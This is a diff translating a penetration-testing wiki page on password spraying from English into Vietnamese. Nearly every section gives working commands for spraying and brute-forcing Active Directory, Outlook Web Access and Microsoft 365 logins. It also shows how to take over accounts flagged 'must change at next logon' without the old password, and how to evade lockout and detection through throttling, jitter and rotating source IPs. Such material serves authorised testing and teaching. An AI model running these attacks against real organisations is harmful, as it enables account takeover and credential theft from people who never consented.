@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-Once you have found several **valid usernames** you can try the most **common passwords** (keep in mind the password policy of the environment) with each of the discovered users.\
-By **default** the **minimum** **password** **length** is **7**.
+Sau khi tìm thấy một số **tên người dùng hợp lệ**, bạn có thể thử các **mật khẩu phổ biến nhất** (hãy lưu ý chính sách mật khẩu của môi trường) với từng người dùng đã phát hiện.\
+Theo **mặc định**, **độ dài** **mật khẩu** tối thiểu là **7**.
 
-Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Danh sách tên người dùng phổ biến cũng có thể hữu ích: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Notice that you **could lockout some accounts if you try several wrong passwords** (by default more than 10).
+Lưu ý rằng bạn **có thể khóa một số tài khoản nếu thử nhiều mật khẩu sai** (theo mặc định là hơn 10 lần).
 
-### Get password policy
+### Lấy chính sách mật khẩu
 
-If you have some user credentials or a shell as a domain user you can **get the password policy with**:
+Nếu bạn có thông tin đăng nhập của một người dùng hoặc shell với tư cách là người dùng domain, bạn có thể **lấy chính sách mật khẩu bằng cách**:
 
 ```bash
 # From Linux
@@ -33,9 +33,9 @@ net accounts
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
 
-### Exploitation from Linux (or all)
+### Khai thác từ Linux (hoặc tất cả)
 
-- Using **crackmapexec:**
+- Sử dụng **crackmapexec:**
 
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
@@ -44,7 +44,7 @@ crackmapexec smb <IP> -u users.txt -p passwords.txt
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
 
-- Using **NetExec (CME successor)** for targeted, low-noise spraying across SMB/WinRM:
+- Sử dụng **NetExec (CME successor)** để thực hiện spraying có mục tiêu, ít gây nhiễu trên SMB/WinRM:
 
 ```bash
 # Optional: generate a hosts entry to ensure Kerberos FQDN resolution
@@ -61,7 +61,7 @@ netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"
 sudo ntpdate <DC_FQDN>
 ```
 
-- Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
+- Sử dụng [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
 
 ```bash
 # Password Spraying
@@ -70,24 +70,24 @@ sudo ntpdate <DC_FQDN>
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
 
-- [**spray**](https://github.com/Greenwolf/Spray) _**(you can indicate number of attempts to avoid lockouts):**_<sup>[[3]](#references)</sup>
+- [**spray**](https://github.com/Greenwolf/Spray) _**(bạn có thể chỉ định số lần thử để tránh bị khóa tài khoản):**_<sup>[[3]](#references)</sup>
 
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
 
-- Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NOT RECOMMENDED SOMETIMES DOESN'T WORK<sup>[[2]](#references)</sup>
+- Sử dụng [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - KHÔNG KHUYẾN NGHỊ, ĐÔI KHI KHÔNG HOẠT ĐỘNG<sup>[[2]](#references)</sup>
 
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
 
-- With the `scanner/smb/smb_login` module of **Metasploit**:
+- Với module `scanner/smb/smb_login` của **Metasploit**:
 
-![Password Spraying - Brute-Force: With the scanner/smb/smb login module of Metasploit](<../../images/image (745).png>)
+![Password Spraying - Brute-Force: Với module scanner/smb/smb login của Metasploit](<../../images/image (745).png>)
 
-- Using **rpcclient**:<sup>[[6]](#references)</sup>
+- Sử dụng **rpcclient**:<sup>[[6]](#references)</sup>
 
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
@@ -96,9 +96,9 @@ for u in $(cat users.txt); do
 done
 ```
 
-#### From Windows
+#### Trên Windows
 
-- With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
+- Với phiên bản [Rubeus](https://github.com/Zer1t0/Rubeus) có module brute:
 
 ```bash
 # with a list of users
@@ -108,24 +108,24 @@ done
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
 
-- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (It can generate users from the domain by default and it will get the password policy from the domain and limit tries according to it):<sup>[[4]](#references)</sup>
+- Với [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Theo mặc định, công cụ có thể tạo danh sách người dùng từ domain, lấy chính sách mật khẩu của domain và giới hạn số lần thử theo chính sách đó):<sup>[[4]](#references)</sup>
 
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 
-- With [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
+- Với [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
 
 ```
 Invoke-SprayEmptyPassword
 ```
 
-### Identify and Take Over "Password must change at next logon" Accounts (SAMR)
+### Xác định và chiếm quyền các tài khoản "Password must change at next logon" (SAMR)
 
-A low-noise technique is to spray a benign/empty password and catch accounts returning STATUS_PASSWORD_MUST_CHANGE, which indicates the password was forcibly expired and can be changed without knowing the old one.<sup>[[9]](#references)[[10]](#references)</sup>
+Một kỹ thuật ít gây chú ý là thử hàng loạt mật khẩu trống/không gây hại và phát hiện các tài khoản trả về STATUS_PASSWORD_MUST_CHANGE, cho biết mật khẩu đã bị buộc hết hạn và có thể được đổi mà không cần biết mật khẩu cũ.<sup>[[9]](#references)[[10]](#references)</sup>
 
-Workflow:
-- Enumerate users (RID brute via SAMR) to build the target list:
+Quy trình:
+- Liệt kê người dùng (brute-force RID qua SAMR) để lập danh sách mục tiêu:
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
@@ -136,14 +136,14 @@ Workflow:
 netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
 ```
 
-- Spray an empty password and keep going on hits to capture accounts that must change at next logon:
+- Thực hiện password spraying với mật khẩu trống và tiếp tục với các hit để thu thập những tài khoản bắt buộc phải đổi mật khẩu ở lần đăng nhập tiếp theo:
 
 ```bash
 # Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
 netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
 ```
 
-- For each hit, change the password over SAMR with NetExec’s module (no old password needed when "must change" is set):
+- Với mỗi kết quả khớp, đổi mật khẩu qua SAMR bằng module của NetExec (không cần mật khẩu cũ khi đã đặt tùy chọn "must change"):
 
 ```bash
 # Strong complexity to satisfy policy
@@ -154,9 +154,9 @@ netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
 netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
 ```
 
-Operational notes:
-- Ensure your host clock is in sync with the DC before Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
-- A [+] without (Pwn3d!) in some modules (e.g., RDP/WinRM) means the creds are valid but the account lacks interactive logon rights.
+Ghi chú vận hành:
+- Đảm bảo đồng hồ trên máy của bạn đồng bộ với DC trước khi thực hiện các thao tác dựa trên Kerberos: `sudo ntpdate <dc_fqdn>`.
+- Dấu [+] không kèm (Pwn3d!) trong một số module (ví dụ: RDP/WinRM) nghĩa là thông tin xác thực hợp lệ nhưng tài khoản không có quyền đăng nhập tương tác.
 
 ## Brute Force
 
@@ -164,19 +164,19 @@ Operational notes:
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
 
-### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
+### Password spraying dựa trên Kerberos pre-auth với nhắm mục tiêu qua LDAP và điều tiết có xét PSO (SpearSpray)
 
-Kerberos pre-auth–based spraying reduces noise vs SMB/NTLM/LDAP bind attempts and aligns better with AD lockout policies. SpearSpray couples LDAP-driven targeting, a pattern engine, and policy awareness (domain policy + PSOs + badPwdCount buffer) to spray precisely and safely. It can also tag compromised principals in Neo4j for BloodHound pathing.<sup>[[1]](#references)</sup>
+Password spraying dựa trên Kerberos pre-auth giảm nhiễu so với các lần thử SMB/NTLM/LDAP bind và phù hợp hơn với các chính sách khóa tài khoản AD. SpearSpray kết hợp nhắm mục tiêu qua LDAP, pattern engine và khả năng nhận biết chính sách (chính sách domain + PSO + ngưỡng đệm badPwdCount) để thực hiện spraying chính xác và an toàn. Công cụ cũng có thể đánh dấu các principal đã bị xâm nhập trong Neo4j để hỗ trợ tìm đường đi trong BloodHound.<sup>[[1]](#references)</sup>
 
-Key ideas:
-- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
-- Domain lockout policy + PSO-aware filtering to leave a configurable attempt buffer (threshold) and avoid locking users.
-- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
-- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
-- Throughput control with threads, jitter, and max requests per second.
-- Optional Neo4j integration to mark owned users for BloodHound.
+Ý tưởng chính:
+- Khám phá người dùng qua LDAP với phân trang và hỗ trợ LDAPS, tùy chọn sử dụng bộ lọc LDAP tùy chỉnh.
+- Lọc dựa trên chính sách khóa tài khoản của domain và PSO để chừa một ngưỡng đệm số lần thử có thể cấu hình, tránh khóa tài khoản người dùng.
+- Xác thực Kerberos pre-auth bằng các binding gssapi nhanh (tạo sự kiện 4768/4771 trên DC thay vì 4625).
+- Tạo mật khẩu theo pattern cho từng người dùng, sử dụng các biến như tên và giá trị thời gian suy ra từ pwdLastSet của từng người dùng.
+- Kiểm soát thông lượng bằng threads, jitter và số yêu cầu tối đa mỗi giây.
+- Tích hợp Neo4j tùy chọn để đánh dấu người dùng đã sở hữu cho BloodHound.
 
-Basic usage and discovery:
+Cách sử dụng cơ bản và khám phá:
 
 ```bash
 # List available pattern variables
@@ -189,7 +189,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
 ```
 
-Targeting and pattern control:
+Nhắm mục tiêu và kiểm soát mẫu:
 
 ```bash
 # Custom LDAP filter (e.g., target specific OU/attributes)
@@ -200,7 +200,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
 ```
 
-Stealth and safety controls:
+Các biện pháp kiểm soát stealth và an toàn:
 
 ```bash
 # Control concurrency, add jitter, and cap request rate
@@ -210,13 +210,13 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
 ```
 
-Neo4j/BloodHound enrichment:
+Neo4j/BloodHound enrichment (bổ sung dữ liệu):
 
 ```bash
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
 ```
 
-Pattern system overview (patterns.txt):
+Tổng quan về hệ thống pattern (patterns.txt):
 
 ```text
 # Example templates consuming per-user attributes and temporal context
@@ -227,29 +227,29 @@ Pattern system overview (patterns.txt):
 {extra}{separator}{year}{suffix}
 ```
 
-Available variables include:
+Các biến hiện có:
 - {name}, {samaccountname}
-- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
-- Composition helpers and org token: {separator}, {suffix}, {extra}
+- Thời gian lấy từ pwdLastSet (hoặc whenCreated) của từng người dùng: {year}, {short_year}, {month_number}, {month_en}, {season_en}
+- Các thành phần hỗ trợ tạo mật khẩu và token của tổ chức: {separator}, {suffix}, {extra}
 
-Operational notes:
-- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
-- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
-- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.
+Lưu ý vận hành:
+- Ưu tiên truy vấn PDC-emulator bằng -dc để đọc badPwdCount và thông tin liên quan đến policy một cách chính xác nhất.
+- badPwdCount được reset khi có lần thử tiếp theo sau khoảng thời gian quan sát; hãy sử dụng ngưỡng và thời điểm phù hợp để đảm bảo an toàn.
+- Các lần thử Kerberos pre-auth xuất hiện trong telemetry của DC dưới dạng 4768/4771; hãy sử dụng jitter và rate-limiting để hòa lẫn vào lưu lượng bình thường.
 
-> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.
+> Mẹo: Kích thước trang LDAP mặc định của SpearSpray là 200; điều chỉnh bằng -lps khi cần.
 
 ## Outlook Web Access
 
-There are multiples tools for p**assword spraying outlook**.
+Có nhiều công cụ để **password spraying outlook**.
 
-- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
-- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
-- With [Ruler](https://github.com/sensepost/ruler) (reliable!)<sup>[[5]](#references)</sup>
-- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
-- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
+- Với [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
+- Với [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
+- Với [Ruler](https://github.com/sensepost/ruler) (đáng tin cậy!)<sup>[[5]](#references)</sup>
+- Với [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
+- Với [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-To use any of these tools, you need a user list and a password / a small list of passwords to spray.
+Để sử dụng bất kỳ công cụ nào trong số này, bạn cần danh sách người dùng và một mật khẩu / một danh sách nhỏ các mật khẩu để spray.
 
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
@@ -262,15 +262,15 @@ To use any of these tools, you need a user list and a password / a small list of
 
 ## Microsoft 365 / Entra ID
 
-For cloud spraying, first identify whether the tenant is **managed**, **federated**, or **hybrid**, because the endpoint and the lockout behavior can differ from on-prem AD. In Microsoft Entra, **Smart Lockout** changes how repeated guesses consume the lockout budget:<sup>[[7]](#references)</sup>
+Đối với cloud spraying, trước tiên hãy xác định tenant thuộc loại **managed**, **federated** hay **hybrid**, vì endpoint và cách hoạt động của cơ chế khóa tài khoản có thể khác với AD on-prem. Trong Microsoft Entra, **Smart Lockout** thay đổi cách các lần đoán lặp lại làm tiêu hao hạn mức khóa tài khoản:<sup>[[7]](#references)</sup>
 
-- Repeating the **same bad password** doesn't keep incrementing the lockout counter, but trying **new candidates** does.
-- **Familiar** and **unfamiliar** locations have **separate** counters.
-- Tenants using **pass-through authentication (PTA)** don't benefit from the bad-password hash tracking, so treat them more like classic lockout-sensitive targets.
+- Lặp lại **cùng một mật khẩu sai** sẽ không tiếp tục tăng bộ đếm khóa tài khoản, nhưng thử **các mật khẩu khác** thì có.
+- Các vị trí **quen thuộc** và **không quen thuộc** có bộ đếm **riêng biệt**.
+- Tenant sử dụng **pass-through authentication (PTA)** không được hưởng lợi từ cơ chế theo dõi hash mật khẩu sai, vì vậy hãy xem chúng như các mục tiêu nhạy cảm với cơ chế khóa tài khoản kiểu cổ điển.
 
-In practice, spray **one password per round**, keep enough spacing between rounds, and prefer tooling that can discover the tenant's actual auth flow before sending guesses.
+Trên thực tế, hãy spray **một mật khẩu mỗi lượt**, giãn cách đủ lâu giữa các lượt và ưu tiên công cụ có thể phát hiện luồng xác thực thực tế của tenant trước khi gửi các lần đoán.
 
-- With [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), you can recon the tenant, discover the `token_endpoint`, spray `msol`/`adfs`/`owa`/`okta`, and rotate traffic through multiple egress IPs:
+- Với [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), bạn có thể recon tenant, phát hiện `token_endpoint`, spray `msol`/`adfs`/`owa`/`okta` và luân phiên lưu lượng qua nhiều IP egress:
 
 ```bash
 # Enumerate tenant info, autodiscover, and the token endpoint
@@ -287,7 +287,7 @@ trevorspray -u users.txt -p 'Winter2025!' \
   --ssh root@1.2.3.4 root@4.3.2.1 --delay 5
 ```
 
-- With [**Spray365**](https://github.com/MarkoH17/Spray365), you can pre-build a resumable **execution plan**, randomize auth order, and enforce a **minimum delay per user** to stay outside the lockout window:
+- Với [**Spray365**](https://github.com/MarkoH17/Spray365), bạn có thể tạo trước một **execution plan** có thể tiếp tục sau khi tạm dừng, xáo trộn thứ tự xác thực và áp dụng **khoảng trễ tối thiểu cho mỗi người dùng** để tránh khoảng thời gian bị khóa tài khoản:
 
 ```bash
 # Generate a plan with shuffled auth order and a per-user minimum delay
@@ -299,7 +299,7 @@ python3 spray365.py generate normal -ep plan.s365 -d corp.com \
 python3 spray365.py spray -ep plan.s365 -l 5
 ```
 
-- With [**o365spray**](https://github.com/0xZDH/o365spray), you can validate the tenant, enumerate users with modules such as `onedrive`, and spray via `oauth2` or `adfs` while keeping **one attempt per user** per lockout window. If you already have a FireProx API, pass it with `--proxy-url` to distribute the source IPs:
+- Với [**o365spray**](https://github.com/0xZDH/o365spray), bạn có thể xác thực tenant, liệt kê users bằng các module như `onedrive`, và spray qua `oauth2` hoặc `adfs`, đồng thời giữ **mỗi user chỉ một lần thử** trong mỗi khoảng thời gian khóa tài khoản. Nếu đã có FireProx API, hãy truyền API đó bằng `--proxy-url` để phân tán các địa chỉ IP nguồn:
 
 ```bash
 o365spray --validate --domain corp.com
@@ -307,7 +307,7 @@ o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
 o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
 ```
 
-Recent operator tradecraft has also moved toward **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) supports time windows, password shuffling, ADFS/M365 spraying, and automatic post-auth exfiltration. Recent real-world abuse also used **Microsoft Teams API** account enumeration and **AWS region rotation** to spread spray waves across multiple source geographies.<sup>[[8]](#references)</sup>
+Kỹ thuật tác chiến gần đây cũng chuyển sang **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) hỗ trợ các khung thời gian, xáo trộn mật khẩu, password spraying ADFS/M365 và tự động exfiltration sau xác thực. Các vụ lạm dụng thực tế gần đây cũng sử dụng **Microsoft Teams API** để liệt kê tài khoản và **xoay vòng khu vực AWS** nhằm phân tán các đợt spraying qua nhiều khu vực địa lý nguồn.<sup>[[8]](#references)</sup>
 
 ## Google
 
@@ -321,15 +321,14 @@ Recent operator tradecraft has also moved toward **distributed cloud spraying**.
 
 ## References
 
-- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
-- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
-- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
-- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
+- [1] [SpearSpray – Nâng cao Password Spraying Active Directory bằng thông tin tình báo về người dùng](https://github.com/sikumy/spearspray)
+- [2] [TarlogicSecurity/kerbrute – Brute-force Kerberos bằng Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
+- [3] [Spray – Công cụ Password Spraying cho thông tin xác thực Active Directory](https://github.com/Greenwolf/Spray)
+- [4] [Password Spraying Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 - [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
-- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
-- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
-- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
-- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
-- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
-
+- [6] [Password Spraying và các thủ thuật thú vị khác với RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
+- [7] [Khóa thông minh của Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
+- [8] [Proofpoint: Kẻ tấn công tung ra TeamFiltration: Chiến dịch chiếm quyền tài khoản](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
+- [9] [HTB Sendai – 0xdf: từ spray đến gMSA rồi DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [10] [HTB: Baby — LDAP ẩn danh → Password Spray → SeBackupPrivilege → Quản trị viên miền](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
 {{#include ../../banners/hacktricks-training.md}}
